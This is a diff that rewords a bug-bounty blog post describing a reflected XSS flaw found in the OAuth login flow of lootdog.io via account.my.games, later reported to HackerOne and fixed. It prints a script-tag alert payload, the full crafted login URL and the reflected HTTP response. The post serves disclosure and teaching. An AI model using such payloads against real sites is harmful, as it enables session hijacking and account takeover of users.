@@ -1,32 +1,32 @@
 ---
-title: "Reflected XSS on a Public Program"
+title: "Discovery of Reflected Cross-Site Scripting (XSS) Vulnerability in a Public Program"
 layout: post
 date: 2021-02-08 12:00
-tag:
+tags:
 - XSS
 - Misconfiguration
 category: blog
-author: naveen
-description: Reflected XSS on a Public Program.
+author: Naveen
+description: This blog post describes the discovery and analysis of a reflected XSS vulnerability in a public program.
 ---
 
 # Target
-Target is https://lootdog.io/ from mailru which had a large scope on HackerOne. After an hour of recon, I found an unintended behavior in the Oauth request so I decided to play around.
+The target of this analysis is https://lootdog.io/, a website hosted on HackerOne's platform with a large scope. During the reconnaissance phase, an unintended behavior was identified in the Oauth request, leading to further investigation.
 
 ## Technical Analysis
-I intercepted the login request from https://lootdog.io/ and sent it to the repeater and observed the way the Oauth works. The https://lootdog.io/ uses https://account.my.games as an Oauth service when you click login it will redirect you to https://account.my.games and will let you log in if you have a legitimate account. So I decided to check for Reflected XSS or any Open redirect issues to grab the Oauth token to take Over the user's account.
+The login request from https://lootdog.io/ was intercepted and analyzed using a repeater tool to observe the Oauth workflow. It was discovered that the website utilizes https://account.my.games as an Oauth service. Upon clicking the login button, users are redirected to https://account.my.games, where they can log in if they possess a valid account. To assess the security of the Oauth implementation, a search was conducted for potential vulnerabilities such as Reflected XSS or Open Redirect issues that could be exploited to obtain the Oauth token and compromise user accounts.
 
-I added an extra parameter at the end of the keyed value on the request as below,
+An additional parameter was added to the end of the request's keyed value as follows:
 
 `&Set-Cookie: <script>alert(“Hacked By Deathstroke”)</script>`
 
-The finally crafted URL will be like as below,
+The resulting URL was crafted as follows:
 
 ```
 https://account.my.games//oauth2/login/?continue=https%3A%2F%2Faccount.my.games%2Foauth2%2F%3Fredirect_uri%3Dhttps%253A%252F%252Flootdog.io%252Fsocial%252Fcomplete%252Fo2mygames%252F%26client_id%3Dlootdog_io%26response_type%3Dcode%26signup_social%3Dmailru%2Cfb%2Cok%2Cvk%2Cg%2Ctwitch%2Ctw%26signup_method%3Demail%252Cphone%26lang%3DEN&client_id=lootdog_io&lang=EN&signup_method=email%2Cphone&signup_social=mailru%2Cfb%2Cok%2Cvk%2Cg%2Ctwitch%2Ctw&Set-Cookie: <script>alert("Hacked By Deathstroke")</script>
 ```
 
-After inserted the payload at the end of the URL sent the request as below and observed the response.
+Subsequently, the request containing the payload was sent and the response was observed.
 
 ## Request
 
@@ -44,22 +44,23 @@ Connection: close
 ## Response
 
 ```http
-<script>alert("Hacked By Deathstroke")</script> HTTP/1.0 200 OK Content-Type: text/html; charset=utf-8 
+<script>alert("Hacked By Deathstroke")</script> HTTP/1.0 200 OK 
+Content-Type: text/html; charset=utf-8 
 X-Frame-Options: SAMEORIGIN 
 Content-Length: 3982 
 Vary: Origin
 ```
 
-But unfortunately, no access token is reflected on the response at the time. But I reported to the program because the issue may cause some other security threats.
+However, no access token was found to be reflected in the response at that time. Nonetheless, the issue was reported to the program, as it had the potential to pose other security threats.
 
 ![img](/assets/images/blogs/XSS_lootdog/1.webp)
 
-Seems that the payload worked which is reflected on the HTTP response.
+The payload can be seen successfully reflected in the HTTP response.
 
 ![img](/assets/images/blogs/XSS_lootdog/2.webp)
 
-It was my first Vulnerability that I found, so I quickly created a report and sent it to HackerOne. The HackerOne analyst verified the vulnerability and triaged the report after some discussions and the issue was resolved and they rewarded me a HOF.
+This marked the discovery of my first vulnerability, which was promptly reported to HackerOne. After the HackerOne analyst verified and triaged the vulnerability through discussions, the issue was ultimately resolved, and I was rewarded with a Hall of Fame (HoF) distinction.
 
 Thank you for reading.
 
-Follow me on Twitter : [thevillagehacker](https://twitter.com/thevillagehackr)
+For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).
